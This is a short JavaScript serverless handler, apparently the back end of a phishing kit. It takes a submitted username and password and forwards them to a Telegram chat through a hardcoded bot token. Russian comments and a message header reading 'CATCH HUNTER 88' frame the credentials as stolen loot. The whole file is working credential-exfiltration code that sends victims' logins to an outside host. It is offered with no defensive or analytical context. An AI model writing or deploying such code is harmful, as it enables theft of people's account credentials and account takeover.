export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password } = req.body;

    // ТВОИ ДАННЫЕ (УЖЕ ВПИСАНЫ)
    const token = '7919864789:AAHsh4P-qjWzW6P_N_W6rL6-5_7Q'; 
    const chatId = '5686381617';

    const text = `🎯 **УЛОВ HUNTER 88**\n\n👤 Юзер: \`${username}\`\n🔑 Пасс: \`${password}\`\n\n⚓️ Станция: Vercel_Node_JS`;

    try {
        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
        
        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        });

        return res.status(200).json({ ok: true });
    } catch (error) {
        return res.status(500).json({ ok: false });
    }
}
